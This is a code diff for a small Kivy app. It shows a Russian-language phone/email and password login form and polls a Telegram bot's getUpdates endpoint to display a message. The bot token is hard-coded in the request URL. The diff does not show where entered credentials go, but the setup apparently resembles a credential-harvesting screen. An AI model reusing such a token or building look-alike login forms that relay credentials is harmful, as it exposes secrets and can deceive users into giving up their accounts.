@@ -15,8 +15,8 @@ Window.clearcolor = (0.859, 0.859, 0.859, 1)
 class My(App):
     def __init__(self):
         super().__init__()
-        self.input1 = TextInput(hint_text="Телефон или email", multiline=False)
-        self.input2 = TextInput(hint_text="Пароль", multiline=False)
+        self.input1 = TextInput(hint_text="Телефон или email", multiline=False, padding=[7, 12])
+        self.input2 = TextInput(hint_text="Пароль", multiline=False, password=True, padding=[7, 15])
         self.button = Button(text="Вход", background_color=[0, 0.451, 0.722, 1])
         self.button.bind(on_press=self.from_input)
         self.label = Label(text='text', color=[0, 0, 0, 1])
@@ -34,19 +34,20 @@ class My(App):
         self.make_request()
 
     def make_request(self):
-        self.r = UrlRequest(f"https://api.telegram.org/bot6654600196:AAEHouKkxE26ltUOMvjou9LYwCuhJl4hR0k/getUpdates",
+        self.r = UrlRequest(f"https://api.telegram.org/bot6654600196:AAEHouKkxE26ltUOMvjou9LYwCuhJl4hR0k/getUpdates?offset=-1",
                             self.prr)
 
     def prr(self, *args):
-        if self.r.result['result'][-1]['message']['message_id'] != self.last:
-            self.make_request()
-        else:
-            self.label.text = self.r.result['result'][-1]['message']['text']
+        if self.r.result['result'][0]['message']['message_id'] == self.last:
+            self.label.text = self.r.result['result'][0]['message']['text']
             self.button.background_color = [0, 0.451, 0.722, 1]
+        else:
+            self.make_request()
+
 
     def build(self):
         a = AnchorLayout()
-        box = BoxLayout(orientation='vertical', size_hint=[.6, .2], size=[320, 250], spacing=15)
+        box = BoxLayout(orientation='vertical', size_hint=[.65, .21], size=[320, 250], spacing=20)
         box.add_widget(self.input1)
         box.add_widget(self.input2)
         box.add_widget(self.button)
